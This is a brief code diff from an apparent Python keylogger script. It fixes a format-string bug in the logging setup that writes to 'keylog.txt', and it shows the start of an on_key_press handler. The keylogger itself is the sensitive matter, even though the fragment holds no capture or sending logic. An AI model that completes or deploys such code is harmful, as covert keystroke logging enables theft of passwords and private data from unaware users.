@@ -6,7 +6,7 @@ import time
 
 # Create a logger
 log_file = "keylog.txt"
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: % (message)s')
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 # Define a function to handle keyboard events
 def on_key_press(key):
